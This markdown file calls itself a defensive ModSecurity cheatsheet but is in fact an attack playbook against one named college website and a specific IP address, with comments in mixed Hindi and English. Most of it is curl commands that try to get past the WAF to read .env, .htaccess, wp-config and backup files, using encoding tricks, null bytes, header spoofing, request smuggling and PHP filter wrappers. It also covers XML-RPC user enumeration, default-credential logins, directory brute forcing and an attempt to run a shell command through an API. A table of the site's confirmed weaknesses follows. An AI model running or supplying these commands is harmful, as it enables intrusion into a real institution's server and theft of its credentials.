# 🛡️ ModSecurity — Commands Cheatsheet

A quick reference for ModSecurity WAF commands for defensive security and server hardening.

---

## 📦 comman commands

```bash
# Case bypass
curl -k https://deogiricollege.org/.Env
curl -k https://deogiricollege.org/.ENV
curl -k https://deogiricollege.org/WP-CONFIG.PHP

# URL encoding bypass
curl -k https://deogiricollege.org/%2e%65%6e%76
curl -k https://deogiricollege.org/wp-config.php%00

# Path traversal bypass
curl -k https://deogiricollege.org/./.env

---

## ⚙️ Wordpress Version Detecion

```bash
# Check exact version from CSS
curl -s https://deogiricollege.org/wp-login.php | grep -o 'ver=[^"]*'

# Check wp-json for version
curl -s https://deogiricollege.org/wp-json/ | grep -o '"version":"[^"]*"'

# RSS feed check
curl -s https://deogiricollege.org/feed/ | grep -o '<generator[^>]*>[^<]*</generator>'
```

---

## user Enumeration via XML-RPC

```bash
# # system.listMethods to confirm XML-RPC
curl -X POST https://deogiricollege.org/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# wp.getUsersBlogs for user enumeration
curl -X POST https://deogiricollege.org/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>admin</string></value></param></params></methodCall>'
```

---

## plugin-Specific Exploit

```bash
 # Stripe PaymentIntent replay attack
curl -X POST https://deogiricollege.org/wp-json/contact-form-7/v1/contact-forms/ \
  -H "Content-Type: application/json" \
  -d '{"wpcf7_stripe_skip_spam_check": true, ...}'
```

---

## EXternal  Infrastructure testing

```bash
# IIS server hai - try default creds
curl -X POST http://103.116.169.85/ -d "LoginID=admin&Password=admin"

# Directory brute force
ffuf -u http://103.116.169.85/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

---

## 🔍  SUMMARY TABLE

```bash
Vulnerabilidad	Severity	Status
wp-config.php accessible	🔴 Critical	Confirmed
.env / .bak files exposed	🔴 Critical	Confirmed (WAF blocking)
WordPress version disclosure	🟡 Medium	Confirmed
REST API namespace leakage	🟡 Medium	Confirmed
XML-RPC enabled	🟡 Medium	Confirmed
Contact Form 7 plugin	🟡 Medium	Likely vulnerable
Wicked Folders plugin	🟡 Medium	Possible IDOR
Staff Login portal (IIS)	🟠 High	External system
Admission portal (Azure)	🟠 High	External system
/old/ directory accessible	🟢 Low	Confirmed
```

---

## ModSecurity Bypass Techniques
Technique 1: Method Manipulation

```bash
# HEAD method se try karo
curl -I -k https://deogiricollege.org/.env
curl -I -k https://deogiricollege.org/.htaccess
curl -I -k https://deogiricollege.org/.htpasswd

# POST method
curl -X POST -k https://deogiricollege.org/.env

## Technique 2: Header Bypass
# Different User-Agent
curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0" https://deogiricollege.org/.env

# Accept header manipulation
curl -k -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" https://deogiricollege.org/.env

# Cache bypass headers
curl -k -H "Pragma: no-cache" -H "Cache-Control: no-cache" https://deogiricollege.org/.env

## Technique 3: Path Obfuscation (Most Important)
# Double encoding
curl -k https://deogiricollege.org/%2e%65%6e%76
curl -k https://deogiricollege.org/%2e%68%74%61%63%63%65%73%73

# Case manipulation (Windows/Linux case sensitivity)
curl -k https://deogiricollege.org/.ENV
curl -k https://deogiricollege.org/.HtAcCeSs
curl -k https://deogiricollege.org/./.ENV

# Path traversal
curl -k https://deogiricollege.org/anything/../.env
curl -k https://deogiricollege.org/./.env
curl -k https://deogiricollege.org//.env

# Backslash on Windows-based servers
curl -k https://deogiricollege.org/.\env

# Null byte injection
curl -k https://deogiricollege.org/.env%00.txt
curl -k https://deogiricollege.org/.env%00

## Technique 4: Parameter Pollution
# Add random parameters
curl -k "https://deogiricollege.org/.env?dummy=1"
curl -k "https://deogiricollege.org/.env?x=1&y=2"

# Add arbitrary query strings
curl -k "https://deogiricollege.org/.env?modsec=off"
curl -k "https://deogiricollege.org/.env?bypass=1"

## Technique 5: Content Negotiation
# Accept different content types
curl -k -H "Accept: application/octet-stream" https://deogiricollege.org/.env
curl -k -H "Accept: text/plain" https://deogiricollege.org/.env
curl -k -H "Accept: */*" https://deogiricollege.org/.env

# Range header
curl -k -H "Range: bytes=0-500" https://deogiricollege.org/.env

##Technique 6: HTTP Version Toggle
# HTTP/1.0 instead of HTTP/1.1
curl -k --http1.0 https://deogiricollege.org/.env
curl -k --http1.0 https://deogiricollege.org/.htaccess

### Masquerade as internal request
curl -k -e "https://deogiricollege.org/wp-admin/" https://deogiricollege.org/.env
curl -k -H "Referer: https://deogiricollege.org/wp-login.php" https://deogiricollege.org/.env

##Technique 7: Referer Spoofing
# Masquerade as internal request
curl -k -e "https://deogiricollege.org/wp-admin/" https://deogiricollege.org/.env
curl -k -H "Referer: https://deogiricollege.org/wp-login.php" https://deogiricollege.org/.env

##Technique 8: IP-based Bypass (Check Alternate IPs)
# Resolve DNS and try direct IP
dig deogiricollege.org

# Try Azure IP of admission portal
curl -k -H "Host: deogiricollege.org" https://20.219.176.203/.env

```

---

##  WAF Fingerprinting  

```bash
## check which WAF is using
# ModSecurity specific signatures
curl -k -s -D - https://deogiricollege.org/.env 2>&1 | head -20

# Check response headers for WAF name
curl -k -s -D - https://deogiricollege.org/ | grep -i "server\|x-powered\|x-protected\|cf-ray\|mod_security"
```

---

## Simple  Brute Force Approach 

```bash
#!/bin/bash
TARGET="https://deogiricollege.org"
FILES=(".env" ".htaccess" ".htpasswd" "wp-config.bak")

for file in "${FILES[@]}"; do
    echo "=== Testing: $file ==="
    
    # Normal
    curl -sk -o /dev/null -w "%{http_code}" "$TARGET/$file" && echo " - normal"
    
    # Double encoded
    ENCODED=$(python3 -c "from urllib.parse import quote; print(quote('$file'))")
    curl -sk -o /dev/null -w "%{http_code}" "$TARGET/$ENCODED" && echo " - encoded"
    
    # Case
    curl -sk -o /dev/null -w "%{http_code}" "$TARGET/$(echo $file | tr '[:lower:]' '[:upper:]')" && echo " - uppercase"
    
    # HTTP/1.0
    curl -sk --http1.0 -o /dev/null -w "%{http_code}" "$TARGET/$file" && echo " - http1.0"
    
    # Path traversal
    curl -sk -o /dev/null -w "%{http_code}" "$TARGET/../$file" && echo " - traversal"
    
    # With nullbyte
    curl -sk -o /dev/null -w "%{http_code}" "$TARGET/${file}%00" && echo " - nullbyte"
done
---
```


## Mosst  Important 
#Since ModSecurity is returning a "406 Not Acceptable" error, it means a WAF rule is being triggered for dot-files. However, if the same file is accessible via a different extension or path...

```bash
# 1. Pehle check karo ki kya wp-config.php sach mein 0 bytes hai ya nahi
curl -k -s -D - https://deogiricollege.org/wp-config.php | head -20
# Agar 0 bytes hai toh PHP execute ho raha hai - iska matlab config sahi se load hai
# Lekin agar kuch content aata hai toh woh leaked hai!

# 2. .env file ko bypass karo - content negotiation se
curl -k -s -H "Accept: text/plain" -H "X-Requested-With: XMLHttpRequest" --http1.0 "https://deogiricollege.org/.env?$(date +%s)"

# 3. Backup files directly try karo (yeh 406 de rahe the)
curl -k -s -D - "https://deogiricollege.org/wp-config.php.bak" | head -30
curl -k -s -D - "https://deogiricollege.org/backup.sql" | head -50
```

---

## New Advanced Bypass Techniques
#1. CRLF Injection / Request Smuggling


```bash
# Try with newline injection in headers
curl -k -H "X-Custom: test%0d%0aX-Forwarded-For: 127.0.0.1" https://deogiricollege.org/.htaccess

# Tab injection
curl -k -H "Host:\tdeogiricollege.org" https://deogiricollege.org/.htaccess

##2. HTTP Request Smuggling (CL.TE)
printf "GET / HTTP/1.1\r\nHost: deogiricollege.org\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /.htaccess HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc -w5 deogiricollege.org 443

##3. WAF-Specific Bypass - ModSecurity Rule ID Bypass
# Add null byte before extension
curl -k "https://deogiricollege.org/.htaccess%00.html"

# Unicode encoding
curl -k "https://deogiricollege.org/.htaccess%u002e"
curl -k "https://deogiricollege.org/.%u0074xt"

# Long path / path normalization issues
curl -k "https://deogiricollege.org/././././././././.htaccess"

##4. IP Restrictions Bypass - Alternate Host Headers
# Try internal IPs
curl -k -H "Host: 127.0.0.1" https://deogiricollege.org/.htaccess
curl -k -H "Host: localhost" https://deogiricollege.org/.htaccess
curl -k -H "Host: 10.0.0.1" https://deogiricollege.org/.htaccess
curl -k -H "Host: 192.168.1.1" https://deogiricollege.org/.htaccess

##5. X-Forwarded-For Spofing

# Try as localhost
curl -k -H "X-Forwarded-For: 127.0.0.1" https://deogiricollege.org/.htaccess
curl -k -H "X-Forwarded-For: 10.0.0.1" https://deogiricollege.org/.htaccess
curl -k -H "X-Forwarded-For: ::1" https://deogiricollege.org/.htaccess

# Try as internal network
curl -k -H "X-Forwarded-For: 103.116.169.85" https://deogiricollege.org/.htaccess
curl -k -H "X-Real-IP: 127.0.0.1" https://deogiricollege.org/.htaccess
curl -k -H "Client-IP: 127.0.0.1" https://deogiricollege.org/.htaccess

##  PHP-Specific Tricks BCZ WP site
# PHP wrapper
curl -k "https://deogiricollege.org/index.php?page=php://filter/convert.base64-encode/resource=.htaccess"

# Directory traversal via PHP files
curl -k "https://deogiricollege.org/wp-content/plugins/akismet/akismet.php?../../../.htaccess"

##7. Alternative Ports ya Protocols

# Try port 80 (HTTP)
curl -k -L "http://deogiricollege.org/.htpasswd"
curl -k -L "http://deogiricollege.org/.env"

# Try port 8080
curl -k "https://deogiricollege.org:8080/.env"

##8. Wayback Machine se Historical Versions
# Check agar pehle kabhi exposed tha
curl -k "https://web.archive.org/web/20240000000000/https://deogiricollege.org/.env"

```


---
## Important - WordPress Version Confirmed + Vulnerable Plugins
<meta name="generator" content="WordPress 6.9.4" />
"wp-abilities/v1"
/wp-abilities/v1/abilities/{name}/run
"ajax_nonce":"9984a260ad"
```
Plugin	Version	Vulnerabilities
Contact Form 7	6.1.6	CVE-2025-3247 - Order Replay
Wordfence Security	Unknown	WAF + Firewall
Wicked Folders	Unknown	CVE-2026-1883 - IDOR
The Events Calendar	6.16.3	Multiple past CVEs
Bellows Accordion Menu	1.4.4	Possible XSS
WPS Visitor Counter	1.4.9	Possible SQLi
IgniteUp	3.4.1	Coming soon page
Avada Theme	7.3	Multiple past CVEs
Akismet	✅	Active (anti-spam)
```
---

```bash
# X-Forwarded-For bypass - most effective usually
curl -k -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" https://deogiricollege.org/.env

# Alternate IPs of same server
curl -k -H "Host: deogiricollege.org" https://20.219.176.203/.env

##Step 2: Custom wp-abilities API test karo
# List all available abilities
curl -k https://deogiricollege.org/wp-json/wp-abilities/v1/abilities

# Try to run a test
curl -k -X POST "https://deogiricollege.org/wp-json/wp-abilities/v1/abilities/shell/run" \
  -H "Content-Type: application/json" \
  -d '{"input":"id"}'

##Step 3: XML-RPC se brute force
# List methods
curl -k -X POST https://deogiricollege.org/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'




